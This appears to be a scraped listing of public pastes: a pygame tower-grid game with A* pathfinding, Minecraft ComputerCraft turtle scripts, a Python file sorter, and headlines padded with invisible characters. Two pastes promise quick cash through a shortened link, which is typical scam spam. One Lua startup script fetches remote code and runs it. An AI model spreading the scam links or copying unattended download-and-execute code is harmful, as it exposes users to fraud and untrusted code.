        new_row, new_col = row + dr, col + dc
        if is_valid_cell(new_row, new_col, include_blue_towers):
            neighbors.append((new_row, new_col))
    
    return neighbors

def heuristic(a, b):
    """"""Calculate the manhattan distance heuristic""""""
    return abs(a[0] - b[0]) + abs(a[1] - b[1])

def astar_pathfinding(start, goal, include_blue_towers=False):
    """"""A* pathfinding algorithm to find a path from start to goal""""""
    frontier = []
    heapq.heappush(frontier, (0, start))
    came_from = {start: None}
    cost_so_far = {start: 0}
    
    while frontier:
        _, current = heapq.heappop(frontier)
        
        if current == goal:
            break
        
        for next_node in get_neighbors(current, include_blue_towers):
            new_cost = cost_so_far[current] + 1
            if next_node not in cost_so_far or new_cost < cost_so_far[next_node]:
                cost_so_far[next_node] = new_cost
                priority = new_cost + heuristic(next_node, goal)
                heapq.heappush(frontier, (priority, next_node))
                came_from[next_node] = current
    
    # Reconstruct the path
    if goal not in came_from:
        return []
        
    path = [goal]
    while path[-1] != start:
        path.append(came_from[path[-1]])
    
    path.reverse()
    return path

# List to store troops
troops = []

# Set up the display
screen = pygame.display.set_mode(WINDOW_SIZE)
pygame.display.set_caption(""Clash Royale Style Grid"")
clock = pygame.time.Clock()

# Animation variables
time_passed = 0

# Main game loop
running = True
while running:
    # Get delta time for smooth animations
    dt = clock.get_time() / 1000.0  # Time in seconds
    
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False
        elif event.type == pygame.MOUSEBUTTONDOWN:
            # Get position of the mouse click
            pos = pygame.mouse.get_pos()
            # Calculate the row and column clicked
            column = pos[0] // (CELL_SIZE + MARGIN)
            row = pos[1] // (CELL_SIZE + MARGIN)
            
            # Make sure it's within the grid
            if 0 <= row < GRID_SIZE and 0 <= column < GRID_SIZE:
                # Check if it's not a river (except bridges)
                valid_position = True
                if river_row_start <= row < river_row_end:
                    is_bridge = ((left_bridge_col <= column < left_bridge_col + bridge_width) or 
                               (right_bridge_col <= column < right_bridge_col + bridge_width))
                    if not is_bridge:
                        valid_position = False
                
                # Don't place troops on the top (enemy) side
                if row < river_row_start:
                    valid_position = False
                
                # Don't place troops on blue towers
                if (row, column) in blue_tower_positions:
                    valid_position = False
                
                if valid_position:
                    # Create a new troop
                    new_troop = Troop(row, column)
                    troops.append(new_troop)
                    print(f""Placed a troop at ({row}, {column})"")
                else:
                    print(""Invalid placement position"")
    
    # Update troops
    for troop in troops:
        troop.update(dt)
    
    # Remove inactive troops
    troops = [troop for troop in troops if troop.active]
    
    # Update animation time
    time_passed += dt
    
    # Clear screen
    screen.fill(BLACK)
    
    # Draw background terrain (alternating grass pattern)
    for row in range(GRID_SIZE):
        for column in range(GRID_SIZE):
            # Calculate the position for each cell
            x = column * (CELL_SIZE + MARGIN) + MARGIN
            y = row * (CELL_SIZE + MARGIN) + MARGIN
            
            # Alternate between light and dark grass for a checkerboard effect
            if (row + column) % 2 == 0:
                grass_color = LIGHT_GRASS
            else:
                grass_color = DARK_GRASS
                
            # Draw the terrain cell
            pygame.draw.rect(screen, grass_color, [x, y, CELL_SIZE, CELL_SIZE])
    
    # Draw the river crossing the middle
    for row in range(river_row_start, river_row_end):
        for column in range(GRID_SIZE):
            x = column * (CELL_SIZE + MARGIN) + MARGIN
            y = row * (CELL_SIZE + MARGIN) + MARGIN
            
            # Check if this is a bridge position
            is_bridge = ((left_bridge_col <= column < left_bridge_col + bridge_width) or 
                        (right_bridge_col <= column < right_bridge_col + bridge_width))
            
            if is_bridge:
                # Draw bridge
                pygame.draw.rect(screen, BRIDGE_BROWN, [x, y, CELL_SIZE, CELL_SIZE])
                # Add bridge planks
                for i in range(3):
                    plank_y = y + (i+1) * CELL_SIZE // 4
                    pygame.draw.line(screen, (100, 70, 30), 
                                    (x, plank_y), (x + CELL_SIZE, plank_y), 2)
            else:
                # Draw river
                pygame.draw.rect(screen, RIVER_BLUE, [x, y, CELL_SIZE, CELL_SIZE])
                
                # Add wave animation to the river
                wave_height = 3 * math.sin(column / 2 + time_passed * 2)
                pygame.draw.line(screen, (150, 220, 255), 
                                (x, y + CELL_SIZE // 2 + wave_height),
                                (x + CELL_SIZE, y + CELL_SIZE // 2 - wave_height), 2)
    
    # Add some bubbles/foam to the river (avoid bridges)
    for i in range(5):
        bubble_x = (int(time_passed * 100 + i * 100) % WINDOW_SIZE[0])
        bubble_y = river_row_start * (CELL_SIZE + MARGIN) + MARGIN + CELL_SIZE // 2
        
        # Check if bubble is on a bridge
        bubble_col = bubble_x // (CELL_SIZE + MARGIN)
        is_on_bridge = ((left_bridge_col <= bubble_col < left_bridge_col + bridge_width) or 
                        (right_bridge_col <= bubble_col < right_bridge_col + bridge_width))
        
        if not is_on_bridge:
            bubble_size = random.randint(2, 4)
            pygame.draw.circle(screen, (200, 230, 255), (bubble_x, bubble_y), bubble_size)
    
    # Draw the tower areas and grid cells
    for row in range(GRID_SIZE):
        for column in range(GRID_SIZE):
            # Skip if this is a river cell (not a bridge)
            is_bridge = False
            if river_row_start <= row < river_row_end:
                is_bridge = ((left_bridge_col <= column < left_bridge_col + bridge_width) or 
                           (right_bridge_col <= column < right_bridge_col + bridge_width))
                if not is_bridge:
                    continue
                
            # Calculate the position for each cell
            x = column * (CELL_SIZE + MARGIN) + MARGIN
            y = row * (CELL_SIZE + MARGIN) + MARGIN
            
            # Determine if this cell is in a tower area
            is_tower_cell = False
            
            # Check top towers (red team)
            if (tower1_top_x <= column < tower1_top_x + tower1_top_size and 
                tower1_top_y <= row < tower1_top_y + tower1_top_size):
                # Main tower (top) - King tower
                color = RED
                is_tower_cell = True
                if grid[row][column] == 1:
                    # Draw activated tower
                    pygame.draw.rect(screen, (255, 50, 50), [x, y, CELL_SIZE, CELL_SIZE])
                else:
                    # Draw tower with border
                    pygame.draw.rect(screen, RED, [x, y, CELL_SIZE, CELL_SIZE])
                    pygame.draw.rect(screen, (255, 0, 0), [x+2, y+2, CELL_SIZE-4, CELL_SIZE-4], 2)
            elif (tower2_top_x <= column < tower2_top_x + tower2_top_size and 
                  tower2_top_y <= row < tower2_top_y + tower2_top_size):
                # Princess tower 1 (top)
                color = RED
                is_tower_cell = True
                if grid[row][column] == 1:
                    # Draw activated tower
                    pygame.draw.rect(screen, (255, 50, 50), [x, y, CELL_SIZE, CELL_SIZE])
                else:
                    # Draw tower with border
                    pygame.draw.rect(screen, RED, [x, y, CELL_SIZE, CELL_SIZE])
                    pygame.draw.rect(screen, (255, 0, 0), [x+2, y+2, CELL_SIZE-4, CELL_SIZE-4], 2)
            elif (tower3_top_x <= column < tower3_top_x + tower3_top_size and 
                  tower3_top_y <= row < tower3_top_y + tower3_top_size):
                # Princess tower 2 (top)
                color = RED
                is_tower_cell = True
                if grid[row][column] == 1:
                    # Draw activated tower
                    pygame.draw.rect(screen, (255, 50, 50), [x, y, CELL_SIZE, CELL_SIZE])
                else:
                    # Draw tower with border
                    pygame.draw.rect(screen, RED, [x, y, CELL_SIZE, CELL_SIZE])
                    pygame.draw.rect(screen, (255, 0, 0), [x+2, y+2, CELL_SIZE-4, CELL_SIZE-4], 2)
            
            # Check bottom towers (blue team)
            elif (tower1_bottom_x <= column < tower1_bottom_x + tower1_bottom_size and 
                  tower1_bottom_y <= row < tower1_bottom_y + tower1_bottom_size):
                # Main tower (bottom) - King tower
                color = BLUE
                is_tower_cell = True
                if grid[row][column] == 1:
                    # Draw activated tower
                    pygame.draw.rect(screen, (50, 50, 255), [x, y, CELL_SIZE, CELL_SIZE])
                else:
                    # Draw tower with border
                    pygame.draw.rect(screen, BLUE, [x, y, CELL_SIZE, CELL_SIZE])
                    pygame.draw.rect(screen, (0, 0, 255), [x+2, y+2, CELL_SIZE-4, CELL_SIZE-4], 2)
            elif (tower2_bottom_x <= column < tower2_bottom_x + tower2_bottom_size and 
                  tower2_bottom_y <= row < tower2_bottom_y + tower2_bottom_size):
                # Princess tower 1 (bottom)
                color = BLUE
                is_tower_cell = True
                if grid[row][column] == 1:
                    # Draw activated tower
                    pygame.draw.rect(screen, (50, 50, 255), [x, y, CELL_SIZE, CELL_SIZE])
                else:
                    # Draw tower with border
                    pygame.draw.rect(screen, BLUE, [x, y, CELL_SIZE, CELL_SIZE])
                    pygame.draw.rect(screen, (0, 0, 255), [x+2, y+2, CELL_SIZE-4, CELL_SIZE-4], 2)
            elif (tower3_bottom_x <= column < tower3_bottom_x + tower3_bottom_size and 
                  tower3_bottom_y <= row < tower3_bottom_y + tower3_bottom_size):
                # Princess tower 2 (bottom)
                color = BLUE
                is_tower_cell = True
                if grid[row][column] == 1:
                    # Draw activated tower
                    pygame.draw.rect(screen, (50, 50, 255), [x, y, CELL_SIZE, CELL_SIZE])
                else:
                    # Draw tower with border
                    pygame.draw.rect(screen, BLUE, [x, y, CELL_SIZE, CELL_SIZE])
                    pygame.draw.rect(screen, (0, 0, 255), [x+2, y+2, CELL_SIZE-4, CELL_SIZE-4], 2)
            
            # Draw normal grid cells (if not a tower)
            elif grid[row][column] == 1:
                # Draw an activated regular cell (troop placement indicator)
                pygame.draw.rect(screen, GREEN, [x, y, CELL_SIZE, CELL_SIZE], 2)
    
    # Draw all troops
    for troop in troops:
        troop.draw(screen)
    
    # Update the display
    pygame.display.flip()
    
    # Limit to 60 frames per second
    clock.tick(60)

# Clean up
pygame.quit()
sys.exit()
"
7L8gkTRk,Make $1000 15-MINUTES (BEGINNER) FM,liamduhking,JavaScript,Monday 14th of April 2025 06:40:02 PM CDT," 
Pdf https://tinyurl.com/privguidee


VU55dKSXG0
"
NiB8aMuj,mine_deployer,DabDaddy6223,Lua,Monday 14th of April 2025 06:34:19 PM CDT,"ACCEPTABLE_FUEL = {""minecraft:coal""}
FUEL_COUNT = 0

SKIP = {""computercraft:turtle_normal"", ""minecraft:chest""}

TURTLE_INDEX = 2
CHESTS_INDEX = 10
TURTLE_COUNT = 5

MINER_COUNT = 5

function arrHasValue(arr, val)
    for index, value in ipairs(arr) do
        if value == val then
            return true
        end
    end

    return false
end

function hasFuel()
    return FUEL_COUNT > 0
end

function shouldRefuel()
    return turtle.getFuelLevel() <= 0
end

function refuel()
    if shouldRefuel() == true then
        if hasFuel() ~= true then
            return false
        end

        turtle.select(1)
        turtle.refuel(1)
        FUEL_COUNT = FUEL_COUNT - 1
    end

    return true
end

function getSlotCount(slot)
    turtle.select(slot)
    local slotData = turtle.getItemDetail()
    if slotData ~= nil then
        return slotData[""count""]
    end

    return -1
end

function main()
    -- Prepare
    turtle.select(1)
    local slotData = turtle.getItemDetail()
    if slotData ~= nil then
        if arrHasValue(ACCEPTABLE_FUEL, slotData[""name""]) == true then
            FUEL_COUNT = slotData[""count""]
        end
    end
    
    if refuel() ~= true then
        print(""No fuel!"")
        return
    end

    -- Collect turtles and chests
    turtle.turnRight()
    for i=0, 8 do
        turtle.suck()
    end
    turtle.turnLeft()

    -- Leave 2 block gap
    turtle.forward()
    turtle.forward()
    turtle.forward()

    -- Place miners
    for i=0, (TURTLE_COUNT - 1) do
        turtle.turnRight()
        turtle.dig()

        turtle.select(TURTLE_INDEX)
        turtle.place()
        TURTLE_INDEX = TURTLE_INDEX + 1

        turtle.digDown()

        turtle.down()
        
        local inspect, data = turtle.inspect()
        if inspect == true then
            if data[""name""] ~= ""minecraft:chest"" then
                turtle.dig()
                turtle.select(CHESTS_INDEX)
                turtle.place()
            end
        else
            turtle.select(CHESTS_INDEX)
            turtle.place()
        end

        turtle.up()

        turtle.turnLeft()
        turtle.forward()
    end

    turtle.select(2)
    turtle.back()

    for i=0, (TURTLE_COUNT - 1) do
        turtle.turnRight()
        turtle.dig()

        turtle.turnLeft()
        turtle.back()
    end

    turtle.back()
    turtle.back()

    turtle.turnLeft()

    for i=1, 16 do
        turtle.select(i)
        local slotData = turtle.getItemDetail()

        if slotData ~= nil then
            if arrHasValue(SKIP, slotData[""name""]) == false then
                if arrHasValue(ACCEPTABLE_FUEL, slotData[""name""]) == false then
                    turtle.drop()
                end
            end
        end
    end

    turtle.turnRight()
    turtle.turnRight()

    for i=1, 16 do
        turtle.select(i)
        local slotData = turtle.getItemDetail()

        if slotData ~= nil then
            if arrHasValue(SKIP, slotData[""name""]) == true then
                turtle.drop()
            end
        end
    end

    turtle.turnLeft()
end

main()"
GZTzsnT9,EARN $900 INSTANTLY 2025‚≠ê G8,liamduhking,JavaScript,Monday 14th of April 2025 06:26:36 PM CDT," 
Pdf https://tinyurl.com/privguidee


4QLffJsb8J
"
iLzTREiU,client_startup,DabDaddy6223,Lua,Monday 14th of April 2025 06:25:03 PM CDT,"function main()
    shell.execute(""pastebin"", ""get"", ""GHHXut6Y"", ""update"")
    shell.execute(""update"")
    shell.execute(""client"")
end

main()"
GHHXut6Y,update_client,DabDaddy6223,Lua,Monday 14th of April 2025 06:24:30 PM CDT,"PASTE_ID = ""71Dt9x7h""
FILE_NAME = ""client""
 
function main()
    if fs.exists(FILE_NAME) == true then
        fs.delete(FILE_NAME)
    end
 
    shell.execute(""pastebin"", ""get"", PASTE_ID, FILE_NAME)
end
 
main()"
TH1aSh09,Organizar Downloads,MizunoBrasil,Python,Monday 14th of April 2025 06:23:05 PM CDT,"import os
import shutil

# Obter o diret√≥rio atual onde o script est√°
diretorio_atual = os.path.dirname(os.path.abspath(__file__))

# Extens√µes a serem ignoradas
extensoes_ignoradas = ['.py', '.exe']

# Pastas a serem ignoradas (inicialmente vazia, vamos alimentar ela ao longo do script)
pastas_ja_existentes_com_conteudo = []

# Verifica as pastas existentes com arquivos dentro
for item in os.listdir(diretorio_atual):
    caminho = os.path.join(diretorio_atual, item)
    if os.path.isdir(caminho):
        if os.listdir(caminho):  # se a pasta tem arquivos
            pastas_ja_existentes_com_conteudo.append(item.lower())

# Percorrer os arquivos do diret√≥rio atual
for item in os.listdir(diretorio_atual):
    caminho_completo = os.path.join(diretorio_atual, item)

    if os.path.isfile(caminho_completo):
        nome_arquivo, extensao = os.path.splitext(item)

        if extensao and extensao.lower() not in extensoes_ignoradas:
            nome_pasta = extensao[1:].lower()  # remove o ponto da extens√£o

            # Se a pasta de destino j√° existe e tem conte√∫do, ignorar
            if nome_pasta in pastas_ja_existentes_com_conteudo:
                print(f""Ignorado: {item} ‚Üí Pasta '{nome_pasta}' j√° existe com conte√∫do."")
                continue

            pasta_destino = os.path.join(diretorio_atual, nome_pasta)

            # Cria a pasta se ela n√£o existir
            if not os.path.exists(pasta_destino):
                os.makedirs(pasta_destino)

            # Move o arquivo
            novo_caminho = os.path.join(pasta_destino, item)
            try:
                shutil.move(caminho_completo, novo_caminho)
                print(f""Movido: {item} ‚Üí {pasta_destino}/"")
            except Exception as e:
                print(f""Erro ao mover {item}: {e}"")
"
A210RGeY,lavarefuel2,HappySunChild,Lua,Monday 14th of April 2025 05:40:01 PM CDT,"local FUEL_THRESHOLD = turtle.getFuelLimit() - 100 --15000
local BUCKET = ""minecraft:bucket""
local LAVA = ""minecraft:lava""

---@param name string
---@return boolean exists
---@return number slot
local function hasItem(name)
	for slot = 1, 16 do
		local info = turtle.getItemDetail(slot)

		if info and info.name == name then
			return true, slot
		end
	end

	return false, 1
end

assert(hasItem(BUCKET), ""Missing bucket!"")

local function drillRefuel()
	local y = 0

	while true do
		local exists, info = turtle.inspectDown()

		if not exists or info.name ~= LAVA or info.state.level ~= 0 then
			break
		end

		turtle.placeDown()
		turtle.refuel(1)
		turtle.down()

		y = y + 1
	end

	for _ = 1, y do
		turtle.digUp()
		turtle.up()
	end
end

local i = 0

while true do
	drillRefuel()

	if turtle.getFuelLevel() >= FUEL_THRESHOLD then
		break
	end

	repeat
		turtle.dig()
	until turtle.forward()

	i = i + 1
end

for _ = 1, i do
	turtle.back()
end
"
adCq0dBd,News April14 25,Newscaster_Ned,Email,Monday 14th of April 2025 05:02:54 PM CDT,".‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé1‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé2‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé3‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äéc‚Äéo‚Äém‚Äép‚Äél‚Äée‚Äét‚Äée‚Äé.‚Äé

""‚Äéüì∞""‚Äé

J‚ÄéD‚Äé ‚ÄéV‚Äéa‚Äén‚Äéc‚Äée‚Äé ‚ÄéP‚Äéo‚Äés‚Äét‚Äés‚Äé ‚ÄéH‚Äéi‚Äél‚Äéa‚Äér‚Äéi‚Äéo‚Äéu‚Äés‚Äé ‚ÄéT‚Äéa‚Äék‚Äée‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéF‚Äéu‚Äém‚Äéb‚Äél‚Äéi‚Äén‚Äég‚Äé ‚ÄéO‚Äéh‚Äéi‚Äéo‚Äé ‚ÄéS‚Äét‚Äéa‚Äét‚Äée‚Äé'‚Äés‚Äé ‚ÄéC‚Äéh‚Äéa‚Äém‚Äép‚Äéi‚Äéo‚Äén‚Äés‚Äéh‚Äéi‚Äép‚Äé ‚ÄéT‚Äér‚Äéo‚Äép‚Äé
J‚Äéu‚Äéd‚Äég‚Äée‚Äé ‚ÄéR‚Äée‚Äéd‚Äéu‚Äéc‚Äée‚Äés‚Äé ‚ÄéK‚Äéa‚Äér‚Äém‚Äée‚Äél‚Äéo‚Äé ‚ÄéA‚Äén‚Äét‚Äéh‚Äéo‚Äén‚Äéy‚Äé'‚Äés‚Äé ‚ÄéB‚Äéo‚Äén‚Äéd‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚Äé$‚Äé1‚ÄéM‚Äé ‚Äét‚Äéo‚Äé ‚Äé$‚Äé2‚Äé5‚Äé0‚ÄéK‚Äé,‚Äé ‚ÄéP‚Äéu‚Äét‚Äé ‚Äéo‚Äén‚Äé ‚ÄéH‚Äéo‚Äéu‚Äés‚Äée‚Äé ‚ÄéA‚Äér‚Äér‚Äée‚Äés‚Äét‚Äé
T‚Äér‚Äéu‚Äém‚Äép‚Äé ‚ÄéO‚Äéf‚Äéf‚Äéi‚Äéc‚Äéi‚Äéa‚Äél‚Äés‚Äé ‚ÄéS‚Äéc‚Äéh‚Äéo‚Äéo‚Äél‚Äé ‚ÄéC‚ÄéN‚ÄéN‚Äé'‚Äés‚Äé ‚ÄéK‚Äéa‚Äéi‚Äét‚Äél‚Äéa‚Äén‚Äé ‚ÄéC‚Äéo‚Äél‚Äél‚Äéi‚Äén‚Äés‚Äé ‚Äéo‚Äén‚Äé ‚ÄéE‚Äél‚Äé ‚ÄéS‚Äéa‚Äél‚Äév‚Äéa‚Äéd‚Äéo‚Äér‚Äéa‚Äén‚Äé'‚Äés‚Äé ‚ÄéD‚Äée‚Äép‚Äéo‚Äér‚Äét‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé
S‚Äéo‚Äéu‚Äét‚Äéh‚Äé ‚ÄéA‚Äéf‚Äér‚Äéi‚Äéc‚Äéa‚Äé ‚ÄéS‚Äée‚Äén‚Äéd‚Äés‚Äé ‚ÄéE‚Äén‚Äév‚Äéo‚Äéy‚Äé ‚Äét‚Äéo‚Äé ‚ÄéU‚Äé.‚ÄéS‚Äé.‚Äé ‚ÄéW‚Äéh‚Äéo‚Äé ‚ÄéC‚Äéa‚Äél‚Äél‚Äée‚Äéd‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚Äé‚Äò‚ÄéR‚Äéa‚Äéc‚Äéi‚Äés‚Äét‚Äé,‚Äé‚Äô‚Äé ‚Äé‚Äò‚ÄéH‚Äéo‚Äém‚Äéo‚Äép‚Äéh‚Äéo‚Äéb‚Äée‚Äé‚Äô‚Äé
E‚Äéx‚Äéc‚Äél‚Äéu‚Äés‚Äéi‚Äév‚Äée‚Äé ‚Äé‚Äî‚Äé ‚Äé'‚ÄéR‚Äée‚Äéa‚Äéd‚Äéy‚Äé ‚Äét‚Äéo‚Äé ‚ÄéR‚Äéu‚Äém‚Äéb‚Äél‚Äée‚Äé:‚Äé'‚Äé ‚ÄéM‚Äéi‚Äék‚Äée‚Äé ‚ÄéR‚Äéo‚Äég‚Äée‚Äér‚Äés‚Äé ‚ÄéL‚Äéa‚Äéu‚Äén‚Äéc‚Äéh‚Äée‚Äés‚Äé ‚ÄéM‚ÄéI‚Äé ‚ÄéS‚Äée‚Äén‚Äéa‚Äét‚Äée‚Äé ‚ÄéC‚Äéa‚Äém‚Äép‚Äéa‚Äéi‚Äég‚Äén‚Äé
P‚Äéa‚Äém‚Äé ‚ÄéB‚Äéo‚Äén‚Äéd‚Äéi‚Äé ‚ÄéC‚Äéo‚Äén‚Äéf‚Äéi‚Äér‚Äém‚Äés‚Äé ‚ÄéA‚Äér‚Äér‚Äée‚Äés‚Äét‚Äé ‚ÄéC‚Äéo‚Äén‚Äén‚Äée‚Äéc‚Äét‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚ÄéF‚Äéi‚Äér‚Äée‚Äéb‚Äéo‚Äém‚Äéb‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéN‚ÄéM‚Äé ‚ÄéT‚Äée‚Äés‚Äél‚Äéa‚Äé ‚ÄéD‚Äée‚Äéa‚Äél‚Äée‚Äér‚Äés‚Äéh‚Äéi‚Äép‚Äé
D‚Äée‚Äém‚Äéo‚Äéc‚Äér‚Äéa‚Äét‚Äé ‚ÄéS‚Äée‚Äén‚Äéa‚Äét‚Äéo‚Äér‚Äé ‚ÄéA‚Äés‚Äék‚Äés‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéM‚Äée‚Äée‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚ÄéS‚Äéa‚Äél‚Äév‚Äéa‚Äéd‚Äéo‚Äér‚Äéa‚Äén‚Äé ‚ÄéP‚Äér‚Äée‚Äés‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äé
O‚Äéu‚Äét‚Äég‚Äéo‚Äéi‚Äén‚Äég‚Äé ‚ÄéU‚Äé.‚ÄéS‚Äé.‚Äé ‚ÄéE‚Äén‚Äév‚Äéo‚Äéy‚Äé ‚ÄéA‚Äéc‚Äéc‚Äéu‚Äés‚Äée‚Äés‚Äé ‚ÄéR‚Äéu‚Äés‚Äés‚Äéi‚Äéa‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéD‚Äér‚Äéo‚Äép‚Äép‚Äéi‚Äén‚Äég‚Äé ‚ÄéC‚Äél‚Äéu‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéB‚Äéo‚Äém‚Äéb‚Äés‚Äé ‚Äéo‚Äén‚Äé ‚ÄéU‚Äék‚Äér‚Äéa‚Äéi‚Äén‚Äée‚Äé
G‚Äée‚Äét‚Äé ‚ÄéA‚Äél‚Äél‚Äé ‚ÄéB‚Äér‚Äée‚Äéi‚Äét‚Äéb‚Äéa‚Äér‚Äét‚Äé ‚ÄéN‚Äée‚Äéw‚Äés‚Äé ‚ÄéH‚Äée‚Äér‚Äée‚Äé
H‚Äéo‚Äém‚Äée‚ÄéP‚Äéa‚Äég‚Äée‚Äé
A‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äé ‚ÄéW‚Äéi‚Äén‚Äén‚Äéi‚Äén‚Äég‚Äé!‚Äé

N‚Äév‚Äéi‚Äéd‚Äéi‚Äéa‚Äé ‚Äét‚Äéo‚Äé ‚ÄéI‚Äén‚Äév‚Äée‚Äés‚Äét‚Äé ‚Äé$‚Äé5‚Äé0‚Äé0‚ÄéB‚Äé ‚Äét‚Äéo‚Äé ‚ÄéB‚Äéu‚Äéi‚Äél‚Äéd‚Äé ‚ÄéS‚Äéu‚Äép‚Äée‚Äér‚Äéc‚Äéo‚Äém‚Äép‚Äéu‚Äét‚Äée‚Äér‚Äés‚Äé ‚ÄéE‚Äén‚Äét‚Äéi‚Äér‚Äée‚Äél‚Äéy‚Äé ‚Äéi‚Äén‚Äé ‚ÄéU‚ÄéS‚ÄéA‚Äé

A‚ÄéI‚Äé ‚ÄéC‚Äéh‚Äéi‚Äép‚Äés‚Äé ‚ÄéU‚Äén‚Äéd‚Äée‚Äér‚Äé ‚ÄéP‚Äér‚Äéo‚Äéd‚Äéu‚Äéc‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéi‚Äén‚Äé ‚ÄéA‚Äér‚Äéi‚Äéz‚Äéo‚Äén‚Äéa‚Äé ‚ÄéR‚Äéi‚Äég‚Äéh‚Äét‚Äé ‚ÄéN‚Äéo‚Äéw‚Äé
J‚Äée‚Äén‚Äés‚Äée‚Äén‚Äé ‚ÄéH‚Äéu‚Äéa‚Äén‚Äég‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéN‚Äév‚Äéi‚Äéd‚Äéi‚Äéa‚Äé ‚Äéh‚Äéo‚Äél‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äén‚Äé ‚ÄéA‚ÄéI‚Äé ‚Äéc‚Äéh‚Äéi‚Äép‚Äé
N‚Äév‚Äéi‚Äéd‚Äéi‚Äéa‚Äé ‚Äéh‚Äéa‚Äés‚Äé ‚Äéa‚Äén‚Äén‚Äéo‚Äéu‚Äén‚Äéc‚Äée‚Äéd‚Äé ‚Äép‚Äél‚Äéa‚Äén‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚Äéb‚Äéu‚Äéi‚Äél‚Äéd‚Äé ‚ÄéA‚ÄéI‚Äé ‚Äés‚Äéu‚Äép‚Äée‚Äér‚Äéc‚Äéo‚Äém‚Äép‚Äéu‚Äét‚Äée‚Äér‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚ÄéT‚Äée‚Äéx‚Äéa‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéi‚Äén‚Äév‚Äée‚Äés‚Äét‚Äé ‚Äéu‚Äép‚Äé ‚Äét‚Äéo‚Äé ‚Äé$‚Äé5‚Äé0‚Äé0‚Äé ‚Äéb‚Äéi‚Äél‚Äél‚Äéi‚Äéo‚Äén‚Äé ‚Äéi‚Äén‚Äé ‚ÄéA‚ÄéI‚Äé ‚Äép‚Äér‚Äéo‚Äéd‚Äéu‚Äéc‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéU‚Äén‚Äéi‚Äét‚Äée‚Äéd‚Äé ‚ÄéS‚Äét‚Äéa‚Äét‚Äée‚Äés‚Äé.‚Äé

E‚Äél‚Äéi‚Äéz‚Äéa‚Äéb‚Äée‚Äét‚Äéh‚Äé ‚ÄéW‚Äéa‚Äér‚Äér‚Äée‚Äén‚Äé:‚Äé ‚ÄéC‚Äéo‚Äén‚Äég‚Äér‚Äée‚Äés‚Äés‚Äé ‚ÄéH‚Äéa‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚ÄéT‚Äéa‚Äék‚Äée‚Äé ‚ÄéT‚Äéa‚Äér‚Äéi‚Äéf‚Äéf‚Äé ‚ÄéA‚Äéu‚Äét‚Äéh‚Äéo‚Äér‚Äéi‚Äét‚Äéy‚Äé ‚ÄéA‚Äéw‚Äéa‚Äéy‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé
E‚Äél‚Äéi‚Äéz‚Äéa‚Äéb‚Äée‚Äét‚Äéh‚Äé ‚ÄéW‚Äéa‚Äér‚Äér‚Äée‚Äén‚Äé:‚Äé ‚ÄéC‚Äéo‚Äén‚Äég‚Äér‚Äée‚Äés‚Äés‚Äé ‚ÄéH‚Äéa‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚ÄéT‚Äéa‚Äék‚Äée‚Äé ‚ÄéT‚Äéa‚Äér‚Äéi‚Äéf‚Äéf‚Äé ‚ÄéA‚Äéu‚Äét‚Äéh‚Äéo‚Äér‚Äéi‚Äét‚Äéy‚Äé ‚ÄéA‚Äéw‚Äéa‚Äéy‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé
5‚Äé,‚Äé4‚Äé8‚Äé3‚Äé
